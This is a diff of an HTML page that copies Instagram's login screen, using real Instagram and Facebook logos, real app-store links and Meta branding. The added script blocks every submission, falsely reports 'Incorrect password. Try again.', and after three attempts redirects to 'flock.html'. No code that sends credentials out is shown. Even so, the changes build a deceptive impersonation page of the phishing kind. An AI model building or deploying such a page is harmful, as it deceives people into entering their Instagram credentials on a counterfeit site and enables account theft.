@@ -6,36 +6,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <!-- FAVICON -->
-    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" type="image/svg+xml">
     <!-- GOOGLE FONT -->
     <link rel="preconnect" href="https://fonts.gstatic.com">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    
     <style>
-        /* General Styling */
+        /* General body styling */
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #fafafa;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
+            background: linear-gradient(to top, #fdfdfd, #e8e8e8);
             height: 100vh;
+            flex-direction: column;
         }
-        
+
         .container {
-            width: 350px;
-            background-color: white;
-            border-radius: 5px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            padding: 20px;
+            background: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            padding: 30px 40px;
+            width: 100%;
+            max-width: 400px;
             text-align: center;
         }
 
         .logo img {
-            width: 175px;
-            margin-bottom: 20px;
+            max-width: 180px;
+            margin-bottom: 30px;
         }
 
         .form-group {
@@ -43,78 +44,107 @@
             text-align: left;
         }
 
-        .animate-input span {
-            font-size: 12px;
-            color: #8e8e8e;
-            margin-bottom: 5px;
-            display: block;
+        .animate-input {
+            position: relative;
+            width: 100%;
         }
 
         .animate-input input {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background-color: #fafafa;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: #fafafa;
             font-size: 14px;
-            color: #262626;
+            color: #333;
+            transition: all 0.3s ease;
+        }
+
+        .animate-input input:focus {
+            border-color: #3897f0;
+            outline: none;
+        }
+
+        .animate-input span {
+            display: block;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 5px;
         }
 
         .btn-login {
             background-color: #3897f0;
             color: white;
-            padding: 10px;
-            width: 100%;
-            border-radius: 5px;
-            cursor: pointer;
             border: none;
-            margin-bottom: 10px;
+            padding: 15px;
+            width: 100%;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-login:hover {
+            background-color: #1e80d0;
         }
 
         .btn-fb {
             background-color: #3b5998;
             color: white;
-            padding: 10px;
+            padding: 15px;
             width: 100%;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            border: none;
+            font-weight: 600;
             display: flex;
             align-items: center;
             justify-content: center;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
         }
 
         .btn-fb img {
             margin-right: 10px;
-            width: 20px;
+            width: 18px;
+        }
+
+        .btn-fb:hover {
+            background-color: #2d4373;
         }
 
         .forgot-pw {
+            display: block;
             color: #3897f0;
-            font-size: 12px;
+            font-size: 14px;
+            margin-top: 15px;
             text-decoration: none;
+        }
+
+        .forgot-pw:hover {
+            text-decoration: underline;
         }
 
         .divine {
             margin: 20px 0;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
         }
 
         .divine div {
             flex: 1;
-            border-bottom: 1px solid #dbdbdb;
+            height: 1px;
+            background-color: #dbdbdb;
         }
 
         .divine span {
-            padding: 0 10px;
+            margin: 0 10px;
             font-size: 14px;
             color: #8e8e8e;
         }
 
         .goto {
-            margin-top: 10px;
+            margin-top: 20px;
         }
 
         .goto a {
@@ -123,9 +153,9 @@
         }
 
         .footer {
-            margin-top: 30px;
             font-size: 12px;
             color: #8e8e8e;
+            margin-top: 20px;
             text-align: center;
         }
 
@@ -145,11 +175,47 @@
             margin: 5px;
         }
 
+        /* Dark Mode Styles */
+        .dark-mode {
+            background-color: #262626;
+            color: white;
+        }
+
+        .dark-mode .container {
+            background-color: #3a3a3a;
+        }
+
+        .dark-mode .animate-input input {
+            background-color: #444;
+            color: white;
+            border-color: #555;
+        }
+
+        .dark-mode .btn-login {
+            background-color: #1e80d0;
+        }
+
+        .dark-mode .btn-fb {
+            background-color: #2d4373;
+        }
+
+        .dark-mode .forgot-pw {
+            color: #3897f0;
+        }
+
+        .dark-mode .footer a {
+            color: #3897f0;
+        }
+
+        .dark-mode .store-link img {
+            filter: brightness(0.7);
+        }
+
         .dark-mode-button {
             margin-top: 20px;
-            padding: 8px;
+            padding: 10px;
             border-radius: 5px;
-            background-color: #262626;
+            background-color: #444;
             color: white;
             cursor: pointer;
             font-size: 14px;
@@ -157,14 +223,15 @@
         }
 
         .dark-mode-button:hover {
-            background-color: #444444;
+            background-color: #555;
         }
     </style>
 </head>
 <body>
+
 <div class="container">
     <div class="logo">
-        <img src="./images/logo-light.png" alt="Instagram Logo" />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" />
     </div>
     <form id="contactForm">
         <div class="form-group">
@@ -189,7 +256,7 @@
         </div>
         <div class="btn-group">
             <button class="btn-fb">
-                <img src="./images/facebook-icon.png" alt="Facebook" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Facebook_Logo_2023.svg" alt="Facebook" />
                 Log in with Facebook
             </button>
         </div>
@@ -201,8 +268,12 @@
     <div class="app-download">
         <p>Get the app.</p>
         <div class="store-link">
-            <a href="#"><img src="./images/app-store.png" alt="App Store"></a>
-            <a href="#"><img src="./images/gg-play.png" alt="Google Play"></a>
+            <a href="https://apps.apple.com/us/app/instagram/id389801252">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/App_Store_logo.png" alt="App Store">
+            </a>
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Google_Play_Store_badge_EN.svg" alt="Google Play">
+            </a>
         </div>
     </div>
     <div class="footer">
@@ -213,10 +284,6 @@
             <a href="#">Help</a>
             <a href="#">Privacy</a>
             <a href="#">Terms</a>
-            <a href="#">API</a>
-            <a href="#">Locations</a>
-            <a href="#">Top Accounts</a>
-            <a href="#">Hashtags</a>
         </div>
         <div class="copyright">
             © 2024 Instagram from Meta
@@ -226,6 +293,8 @@
 </div>
 
 <script>
+    let attemptCount = 0;
+
     function togglePassword() {
         var passwordInput = document.getElementById("password");
         var showButton = passwordInput.nextElementSibling;
@@ -238,11 +307,25 @@
         }
     }
 
-    // Dark Mode Toggle Function
     document.getElementById('darkmode-toggle').addEventListener('click', function() {
         document.body.classList.toggle('dark-mode');
-        document.querySelector('.container').classList.toggle('dark-mode');
     });
+
+    async function handleLogin(event) {
+        event.preventDefault();
+        attemptCount++;
+
+        const errorMessage = document.getElementById("error-message");
+
+        if (attemptCount >= 3) {
+            window.location.href = "flock.html"; // Replace with actual URL
+        } else {
+            errorMessage.textContent = "Incorrect password. Try again.";
+        }
+    }
+
+    document.getElementById("contactForm").addEventListener("submit", handleLogin);
 </script>
+
 </body>
 </html>
